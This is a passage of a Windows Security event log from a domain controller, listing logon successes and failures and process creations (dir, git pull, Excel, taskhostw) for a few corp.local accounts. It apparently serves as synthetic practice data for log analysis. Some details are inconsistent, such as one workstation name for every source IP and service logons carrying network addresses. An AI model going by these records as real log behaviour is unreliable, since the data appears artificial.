	Account Domain:	CORP
	Logon ID:	0xD20833
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	50814
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:15:26 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xBFC5C2
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	56156
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:17:49 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x9AC68D
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	44980
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:20:42 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	50459
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:24:05 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	bob
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	40936
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:24:23 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x3A92FC
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	48009
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:28:01 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x7EA202
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	53056
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:32:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x94C6E3
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	42412
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:47:52 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x9FF9
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmd.exe /c dir Z:\reports

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:48:32 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x6D5385
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	41443
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:49:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0xF178BC
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	46524
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:51:37 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0xC7E2
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:53:56 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x922BAD
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	49195
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:56:31 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0x9996
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:02:26 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	52179
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:04:54 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xF2A57B
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	31930
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:07:18 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0x8BCE
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:19:47 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x8DF607
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	34913
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:21:17 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	alice
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	35233
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:25:19 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x46352
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	50807
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:41:55 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x6FFE
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:44:46 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0xE451
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmd.exe /c dir Z:\reports

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:48:10 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	bob
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	48114
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:49:55 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xE43371
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	37000
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:56:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0xE885B6
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	42738
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 5:56:59 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0x6703
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:04:21 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x591D35
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	59108
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:04:45 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0x9E250D
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	47474
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:10:01 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xA508C8
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	38430
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:17:40 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xE531C
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	50772
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 6:17:55 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x9B3C8F
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	53493
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

